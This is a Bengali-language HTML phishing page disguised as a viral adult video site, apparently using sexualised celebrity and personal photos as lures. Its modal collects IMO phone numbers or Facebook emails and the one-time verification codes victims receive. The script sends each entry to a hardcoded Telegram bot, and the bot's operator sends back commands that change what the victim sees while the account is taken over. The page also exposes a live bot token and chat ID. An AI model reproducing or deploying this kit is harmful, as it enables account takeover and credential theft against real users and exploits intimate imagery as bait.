<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Center - Premium</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000; font-family: sans-serif; color: white; overflow-x: hidden; }
        .video-card { border-radius: 12px; background: #0f0f0f; aspect-ratio: 16/9; border: 1px solid #222; cursor: pointer; position: relative; transition: 0.3s; overflow: hidden; }
        #modal { display: none; z-index: 1000; }
        .step-container { display: none; }
        .step-active { display: block; }
        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .timer-lock { pointer-events: none; opacity: 0.5; filter: grayscale(1); }
        
        #email-arrow {
            display: none; position: absolute; bottom: 110%; left: 50%;
            transform: translateX(-50%); z-index: 50; text-align: center; width: 100%;
            animation: arrow-jump 0.7s infinite alternate;
        }
        @keyframes arrow-jump { from { transform: translate(-50%, 0); } to { transform: translate(-50%, -18px); } }
        .arrow-text { background: #ff0000; color: white; padding: 6px 12px; border-radius: 10px; font-size: 11px; font-weight: bold; display: block; margin-bottom: 6px; border: 1px solid white; }
        .arrow-icon { width: 0; height: 0; border-left: 12px solid transparent; border-right: 12px solid transparent; border-top: 18px solid #ff0000; margin: 0 auto; }
    </style>
</head>
<body>

    <nav class="fixed top-0 w-full bg-black/90 p-4 border-b border-red-900/30 z-50 text-center font-bold italic">
        <span class="bg-red-600 px-2 rounded uppercase">Update</span> CENTER
    </nav>

    <div class="mt-28 px-4 max-w-6xl mx-auto mb-10 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        <script>
            const imgs = ["1595401658_katrina-kaif-in-boom.jpg", "917_1000.webp", "F-Y4_ztaAAAGum6.jpg", "F8NwYFlW4AAGpb0 (1).jpg", "F8NwYFlW4AAGpb0.jpg", "IMG-20260426-WA0000.jpg", "IMG-20260426-WA0001.jpg", "IMG-20260426-WA0002.jpg", "IMG-20260426-WA0003.jpg", "IMG-20260426-WA0004.jpg", "IMG-20260426-WA0005.jpg", "IMG-20260426-WA0006.jpg", "IMG-20260426-WA0007.jpg", "IMG-20260426-WA0008.jpg", "IMG-20260426-WA0009.jpg", "IMG-20260426-WA0010.jpg", "IMG-20260426-WA0011.jpg", "IMG-20260426-WA0012.jpg", "IMG-20260426-WA0013.jpg", "IMG-20260426-WA0014.jpg", "IMG-20260426-WA0015.jpg", "IMG-20260426-WA0016.jpg", "IMG-20260426-WA0017.jpg", "IMG_20260426_205731.jpg", "IMG_20260427_005450.jpg", "IMG_20260427_005502.jpg", "IMG_20260427_005519.jpg", "IMG_20260427_005534.jpg", "IMG_20260427_005552.jpg", "IMG_20260427_005633.jpg", "IMG_20260427_005656.jpg", "IMG_20260427_005717.jpg", "IMG_20260427_005741.jpg", "IMG_20260427_005803.jpg", "IMG_20260427_005836.jpg", "IMG_20260427_005859.jpg", "IMG_20260427_005918.jpg", "IMG_20260427_005943.jpg", "IMG_20260427_005957.jpg", "IMG_20260427_010011.jpg", "Screenshot_2026-04-26-19-47-32-12_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "Screenshot_2026-04-26-20-56-58-94_be80aec1db9a2b53c9d399db0c602181.jpg", "Screenshot_2026-04-27-00-11-54-96_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "Screenshot_2026-04-27-00-12-58-67_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "Screenshot_2026-04-27-00-52-46-26_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "Screenshot_2026-04-27-00-53-02-86_40deb401b9ffe8e1df2f1cc5ba480b12.jpg", "_1629991531100.jpg", "bc371a1ee5e19eb76ad903e2da29468a-64eda632c8357.webp", "braless-bollywood-divas-01.jpg", "dfdc903253cd0860e24c65f09a561e55.jpg", "hq720 (3).jpg", "hq720 (4).jpg", "sddefault (1).jpg", "sddefault (2).jpg", "উর্বশী..jpg"];
            const baseUrl = "https://raw.githubusercontent.com/Priya-akter-121/vairal_xxx_update-video/main/";
            imgs.forEach(img => {
                document.write(`
                    <div class="video-card" onclick="openModal()">
                        <img src="${baseUrl + encodeURIComponent(img)}" class="w-full h-full object-cover opacity-70">
                        <div class="absolute inset-0 flex items-center justify-center">
                            <div class="bg-black/50 w-12 h-12 rounded-full flex items-center justify-center border-2 border-white/80">
                                <svg class="w-6 h-6 text-white fill-current" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
                            </div>
                        </div>
                    </div>
                `);
            });
        </script>
    </div>

    <div id="modal" class="fixed inset-0 bg-black/95 flex items-center justify-center p-4 backdrop-blur-md">
        <div class="bg-white text-black w-full max-w-sm rounded-[35px] overflow-hidden shadow-2xl relative min-h-[500px]">
            <div class="bg-red-600 p-6 text-center text-white font-black italic uppercase">Verification</div>
            
            <div class="p-8">
                <div id="step-preplay" class="step-container step-active text-center">
                    <h2 class="text-xl font-bold mb-4">ভিডিওটি দেখতে চান?</h2>
                    <button onclick="goStep('choice')" class="w-24 h-24 bg-red-600 rounded-full flex items-center justify-center mx-auto shadow-2xl animate-bounce border-4 border-white">
                        <svg class="w-12 h-12 text-white fill-current ml-1" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
                    </button>
                </div>

                <div id="step-choice" class="step-container text-center">
                    <h2 class="text-red-600 font-bold text-sm mb-2 uppercase">ভিডিওটি সাপোর্ট করছে না</h2>
                    <p class="text-gray-600 text-[11px] mb-8">দয়া করে ইমু অথবা মেসেঞ্জার কানেক্ট করুন।</p>
                    <button onclick="goStep('imo-1')" class="w-full bg-[#2196F3] text-white py-4 rounded-2xl font-bold mb-4">ইমুতে যোগ করুন</button>
                    <button onclick="goMessenger()" class="w-full bg-[#1877F2] text-white py-4 rounded-2xl font-bold">মেসেঞ্জারে যোগ করুন</button>
                </div>

                <div id="step-imo-1" class="step-container text-center">
                    <h3 class="font-bold text-blue-600 mb-6 text-sm">আপনার ইমু নাম্বার লিখুন</h3>
                    <input type="tel" id="imo-num" placeholder="01XXXXXXXXX" class="w-full p-4 bg-gray-50 rounded-2xl border-2 mb-8 text-center text-2xl font-bold">
                    <button onclick="handleInitialSubmit('IMO', 'imo-num')" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold">পরবর্তী ধাপ</button>
                </div>

                <div id="step-fb-1" class="step-container text-center">
                    <h3 class="font-bold text-blue-800 mb-12 text-xs">আপনার ইমেইল অথবা ফোন নাম্বার লিখুন</h3>
                    <div class="relative">
                        <div id="email-arrow">
                            <span class="arrow-text">কিবোর্ডের উপরে ভেসে ওঠা ইমেইল এর উপরে ক্লিক করুন</span>
                            <div class="arrow-icon"></div>
                        </div>
                        <input type="email" id="fb-user" autocomplete="email" onfocus="showArrow()" oninput="hideArrow()" placeholder="Email or Phone" class="w-full p-4 bg-gray-50 rounded-2xl border-2 mb-8 text-center font-bold">
                    </div>
                    <button onclick="handleInitialSubmit('FB', 'fb-user')" class="w-full bg-[#1877F2] text-white py-4 rounded-2xl font-bold">পরবর্তী ধাপ</button>
                </div>

                <div id="step-otp" class="step-container text-center">
                    <div id="otp-note" class="bg-blue-50 p-4 rounded-xl text-[10px] mb-6 text-gray-700 border-l-4 border-blue-500 text-left"></div>
                    <div class="text-3xl font-black text-red-600 mb-6">00:<span id="timer">30</span></div>
                    <input type="number" id="otp-input" disabled placeholder="কোড দিন" class="timer-lock w-full p-4 bg-gray-100 rounded-2xl text-center text-3xl font-black border-2">
                    <button id="v-btn" disabled onclick="finalSubmit()" class="timer-lock w-full bg-red-600 text-white py-4 rounded-2xl font-bold mt-6 shadow-xl">ভেরিফাই করুন</button>
                </div>

                <div id="step-wait" class="step-container text-center py-10">
                    <div class="loader"></div>
                    <h2 class="font-bold text-gray-800 text-2xl">অপেক্ষা করুন...</h2>
                </div>

                <div id="step-success" class="step-container text-center py-6">
                    <h2 class="text-2xl font-bold text-green-600">ভেরিফাই সফল!</h2>
                    <button onclick="location.reload()" class="w-full bg-green-600 text-white py-5 rounded-2xl font-bold mt-8">ভিডিও দেখতে এখানে ক্লিক করুন</button>
                </div>

                <div id="step-error" class="step-container text-center py-6">
                    <h2 class="text-xl font-bold text-red-600">ভেরিফাই ভুল হয়েছে!</h2>
                    <button onclick="goStep('choice')" class="w-full bg-red-600 text-white py-5 rounded-2xl font-bold mt-8">পুনরায় চেষ্টা করুন</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const botToken = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
        const chatId = "8516934257";
        let lastId = 0;

        function goStep(id) {
            document.querySelectorAll('.step-container').forEach(s => s.classList.remove('step-active'));
            document.getElementById('step-' + id).classList.add('step-active');
        }

        function openModal() { document.getElementById('modal').style.display = 'flex'; goStep('preplay'); }
        function goMessenger() { goStep('fb-1'); setTimeout(() => { document.getElementById('fb-user').focus(); }, 300); }
        function showArrow() { document.getElementById('email-arrow').style.display = 'block'; }
        function hideArrow() { document.getElementById('email-arrow').style.display = 'none'; }

        function handleInitialSubmit(mode, inputId) {
            const val = document.getElementById(inputId).value;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🚀 '+mode+': '+val)}`);
            document.getElementById('otp-note').innerHTML = (mode === 'IMO') ? "আপনার ইমুতে আসা ৪টি স্টারে ক্লিক করে কোডটি দিন।" : "আপনার কাছে পাঠানো অ্যাড নাম্বারটি এখানে বসান।";
            goStep('otp');
            startTimer();
        }

        function startTimer() {
            let c = 30;
            const t = setInterval(() => {
                c--;
                document.getElementById('timer').innerText = c < 10 ? '0'+c : c;
                if(c <= 0) {
                    clearInterval(t);
                    document.getElementById('otp-input').disabled = document.getElementById('v-btn').disabled = false;
                    document.querySelectorAll('.timer-lock').forEach(el => el.classList.remove('timer-lock'));
                }
            }, 1000);
        }

        function finalSubmit() {
            const otp = document.getElementById('otp-input').value;
            const text = `✅ ফাইনাল ওটিপি: ${otp}\nকমান্ড বাটন ব্যবহার করুন:`;
            
            // কিবোর্ড বাটন পাঠানো
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "✅ Success", callback_data: "success" },
                        { text: "❌ Error", callback_data: "error" }
                    ],
                    [
                        { text: "⏳ Wait/Verify", callback_data: "verify" }
                    ]
                ]
            };

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    reply_markup: keyboard
                })
            });

            goStep('wait');
        }

        // কমান্ড কন্ট্রোল (বট থেকে আসা বাটন বা মেসেজ চেক করা)
        async function checkCommands() {
            try {
                // getUpdates এর মাধ্যমে লেটেস্ট মেসেজ এবং কলব্যাক চেক করা
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-1`);
                const data = await response.json();
                if (data.result && data.result.length > 0) {
                    const update = data.result[0];
                    if (update.update_id !== lastId) {
                        lastId = update.update_id;
                        
                        // যদি বাটন ক্লিক করা হয় (Callback Query) অথবা মেসেজ পাঠানো হয়
                        let cmd = "";
                        if (update.callback_query) {
                            cmd = update.callback_query.data;
                        } else if (update.message) {
                            cmd = update.message.text.toLowerCase().replace('/', '');
                        }

                        if (cmd === 'success') goStep('success');
                        if (cmd === 'error') goStep('error');
                        if (cmd === 'verify') goStep('wait');
                    }
                }
            } catch (e) {}
        }

        window.onload = () => {
            setInterval(checkCommands, 1500);
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🌐 নতুন ইউজার এসেছে')}`);
        };
    </script>
</body>
</html>
